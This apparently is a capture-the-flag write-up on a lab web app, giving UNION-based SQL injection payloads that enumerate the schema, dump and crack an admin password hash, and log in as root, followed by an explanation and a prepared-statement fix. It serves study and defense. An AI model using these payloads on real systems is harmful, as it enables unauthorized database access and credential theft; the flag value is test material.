# SQL Admin Connection

`B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

---

## Description

go to `/?page=member`

submit : 
- `1 UNION SELECT column_name , 1 FROM information_schema.columns`
- `1 UNION SELECT table_name , 1 FROM information_schema.columns `
- `1 UNION SELECT table_schema, 1 FROM information_schema.tables`

then : \
`1 UNION SELECT username, password FROM Member_Brute_Force.db_default`

password = 3bf1114a986ba87ed28fc1b5884fc2f8  =>  "shadow"

then go to `/index.php?page=signin`

login :	`root`\
mdp :	`shadow`

---

## How does it work ?

The query executed by the server is probably like `SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id= ` and then it is filled with the parameter sent by the client which should be a number. The id parameter is not protected, which means that you can inject SQL without the server detecting any problem.

You have to send a valid parameter to respect the SQL syntax : \
`SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id=1`

And then the door is opened to append another query to the current string :

`SELECT first_name, last_name FROM Member_Sql_Injection.users WHERE id=1 UNION SELECT username, password FROM Member_Brute_Force.db_default`

The UNION statement allows us to get two other columns (the number of queried columns should be the same as in the first part of the query) from the table we want.

---

## How to prevent it ?

In the case of a php back-end, use PDO :
- The query will be sanitized with the `prepare` statement
- It will then be executed with the `execute` statement once the risk of an undesired effect is avoided

Here is a more detailed explanation found on StackOverflow regarding the `prepare` and `execute` commands :

>The SQL statement you pass to prepare is parsed and compiled by the database server. By specifying parameters (either a ? or a named parameter like :name in the example above) you tell the database engine where you want to filter on. Then when you call execute, the prepared statement is combined with the parameter values you specify.

>The important thing here is that the parameter values are combined with the compiled statement, not an SQL string. SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters, you limit the risk of ending up with something you didn't intend."